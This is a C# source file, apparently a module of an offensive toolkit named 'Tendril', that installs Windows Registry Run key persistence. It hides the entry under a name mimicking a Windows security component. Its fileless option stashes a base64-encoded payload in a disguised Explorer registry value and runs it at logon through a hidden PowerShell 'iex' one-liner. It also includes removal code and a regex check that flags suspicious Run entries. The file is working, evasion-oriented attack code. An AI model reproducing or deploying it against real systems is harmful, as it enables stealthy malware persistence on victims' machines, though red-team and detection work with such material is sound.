using System;
using System.Collections.Generic;
using System.Text.RegularExpressions;
using Tendril.Core;
using Tendril.Utilities;

namespace Tendril.Modules
{
    /// <summary>
    /// Registry Run Key Persistence (T1547.001)
    ///
    /// Classic Run/RunOnce key with a fileless payload option: stores an encoded
    /// PowerShell payload in a separate registry value and points the Run key to
    /// a one-liner that reads and executes it. The actual payload never touches disk.
    ///
    /// Supports HKCU (no admin) and HKLM (admin). The fileless variant stores
    /// the payload in an innocuous-looking registry path to evade cursory inspection.
    /// </summary>
    public class RegistryRunKey : ITendril
    {
        public string Name { get { return "RegistryRunKey"; } }
        public string Description { get { return "Registry Run key persistence - optional fileless payload stash"; } }
        public string MitreId { get { return "T1547.001"; } }
        public bool RequiresAdmin { get { return false; } }
        public bool IsReconOnly { get { return false; } }

        // Run key locations
        private static readonly string[] RunKeyPaths = {
            @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
            @"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
        };

        // Stash location for fileless payloads - looks like a normal software config
        private const string StashPath = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\SessionInfo";

        public TendrilResult Install(Dictionary<string, string> options)
        {
            string valueName, payload, hive;
            bool fileless;

            if (!options.TryGetValue("name", out valueName))
                valueName = "SecurityHealthSystray";

            if (!options.TryGetValue("payload", out payload))
                return new TendrilResult(ResultStatus.Failed, Name,
                    "Missing required option: /payload:<path_or_command>");

            if (!options.TryGetValue("hive", out hive))
                hive = "HKCU";

            string filelessOpt;
            fileless = options.TryGetValue("fileless", out filelessOpt) &&
                       filelessOpt.ToLower() == "true";

            string runKeyPath = RunKeyPaths[0]; // Default to Run (not RunOnce)
            string runOnceOpt;
            if (options.TryGetValue("runonce", out runOnceOpt) && runOnceOpt.ToLower() == "true")
                runKeyPath = RunKeyPaths[1];

            string actualRunValue;

            if (fileless)
            {
                // Encode payload as base64 and stash in a separate reg value
                string encoded = Convert.ToBase64String(
                    System.Text.Encoding.Unicode.GetBytes(payload));

                // Store encoded payload in stash location
                bool stashOk = RegistryUtils.SetRegValue(hive, StashPath, valueName, encoded);
                if (!stashOk)
                    return new TendrilResult(ResultStatus.Failed, Name, "Failed to write payload stash");

                // Run key points to a PowerShell one-liner that reads the stash
                string stashFullPath = hive == "HKLM" ? "HKLM:\\" : "HKCU:\\";
                stashFullPath += StashPath;

                actualRunValue = string.Format(
                    "powershell.exe -w hidden -nop -c \"$d=[System.Text.Encoding]::Unicode.GetString(" +
                    "[Convert]::FromBase64String((Get-ItemProperty '{0}').'{1}'));iex $d\"",
                    stashFullPath.Replace(@"\", @"\\"), valueName);
            }
            else
            {
                actualRunValue = payload;
            }

            bool ok = RegistryUtils.SetRegValue(hive, runKeyPath, valueName, actualRunValue);
            if (!ok)
                return new TendrilResult(ResultStatus.Failed, Name, "Failed to write Run key");

            return new TendrilResult(ResultStatus.Success, Name,
                string.Format("Run key installed: {0}\\{1}\\{2}", hive, runKeyPath, valueName))
                .WithMeta("ValueName", valueName)
                .WithMeta("Hive", hive)
                .WithMeta("Fileless", fileless.ToString())
                .WithMeta("RunKeyPath", runKeyPath);
        }

        public TendrilResult Remove(Dictionary<string, string> options)
        {
            string valueName, hive;
            if (!options.TryGetValue("name", out valueName))
                valueName = "SecurityHealthSystray";
            if (!options.TryGetValue("hive", out hive))
                hive = "HKCU";

            // Remove from both Run and RunOnce
            foreach (string path in RunKeyPaths)
                RegistryUtils.DeleteRegValue(hive, path, valueName);

            // Also clean up the stash
            RegistryUtils.DeleteRegValue(hive, StashPath, valueName);

            return new TendrilResult(ResultStatus.Success, Name,
                string.Format("Run key and stash removed: {0}", valueName))
                .WithMeta("ValueName", valueName)
                .WithMeta("Hive", hive);
        }

        public List<TendrilResult> Check()
        {
            var results = new List<TendrilResult>();
            string[] hives = { "HKCU", "HKLM" };

            foreach (string hive in hives)
            {
                foreach (string path in RunKeyPaths)
                {
                    var values = RegistryUtils.GetRegValues(hive, path);
                    if (values == null) continue;

                    foreach (var kv in values)
                    {
                        string val = kv.Value != null ? kv.Value.ToString() : "";

                        // Flag suspicious entries: powershell, cmd, mshta, rundll32, encoded commands
                        bool suspicious = Regex.IsMatch(val,
                            @"(powershell|cmd\.exe|mshta|rundll32|regsvr32|wscript|cscript|-enc|-e\s|-w\s+hidden)",
                            RegexOptions.IgnoreCase);

                        var result = new TendrilResult(
                            suspicious ? ResultStatus.Warning : ResultStatus.Info,
                            Name,
                            string.Format("{0}\\{1}: {2}", hive, path, kv.Key))
                            .WithMeta("Value", val.Length > 200 ? val.Substring(0, 200) + "..." : val)
                            .WithMeta("Suspicious", suspicious.ToString());

                        results.Add(result);
                    }
                }
            }
            return results;
        }
    }
}
